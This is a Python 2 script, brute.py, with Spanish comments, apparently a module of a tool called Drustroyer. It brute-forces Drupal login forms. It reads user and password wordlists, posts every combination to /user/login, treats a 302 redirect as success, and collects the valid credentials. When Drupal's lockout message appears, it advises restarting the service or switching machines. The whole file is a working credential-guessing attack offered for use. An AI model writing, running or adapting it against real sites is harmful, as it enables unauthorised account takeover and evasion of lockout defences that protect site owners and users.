#!/usr/bin/python
'''
BRUTE.PY

Autor: FCG.

Este script de python esta optimizado para funcionar con la herramienta Drustroyer.

Requiere de dos diccionarios, uno de usuarios y uno de contrasenas. Los cuales deben ser ubicados en el
directorio de scripts en el punto de instalacion de la herramienta.

Disfruta ;)
'''

import requesocks
import requests
import sys
import os
import re
import colors

usrlist = [line.rstrip('\n') for line in open('/opt/drustroyer/script/dependencias/usuarios.txt')]
pswlist = [line.rstrip('\n') for line in open('/opt/drustroyer/script/dependencias/passwords.txt')]

req,target = sys.argv[1],sys.argv[2]
if req.get(target+'/user/login').status_code == 200 and 'password' in req.get(target+'/user/login').text:
	print colors.green('\n[=>>] ')+"Se probara en:\n\t %s/user/login\n"%target
	url = target+'/user/login'
elif req.get(target+'/?q=user/login').status_code == 200 and 'password' in req.get(target+'/?q=user/login').text:
	print colors.green('\n[=>>] ')+"Se probara en:\n\t %s/?q=user/login\n"%target
	url = target+'/?q=user/login'
ValidCredentials =[]
for user in usrlist:
	for pwd in pswlist:
		data = {"name": user ,"pass": pwd, "form_id":"user_login"}
		print "Probando: "+user+" "+pwd;
		html = req.post(url, data=data)
		htmltext = html.text
		if re.findall(re.compile('Sorry, too many failed login attempts|Try again later'),htmltext):
			msg = "Tu IP ha sido bloqueada por Drupal. Reinicia el servicio o intenta en otro equipo"
			print msg
		try:
			if html.history:
				if html.history[0].status_code in [302]:
					ValidCredentials.append([user,pwd])
					req.cookies.clear()
		except Exception as e:
			print e
if ValidCredentials:
	retorno = 'Credenciales validas halladas\n'
	for d in ValidCredentials:
		print "Credenciales validas halladas: "+d[0]+" "+d[1];
		retorno += "USER: "+d[0]+" PASS:"+d[1]+'\n'
elif not ValidCredentials:
	retorno = 'NO SE HALLARON CREDENCIALES VALIDAS.'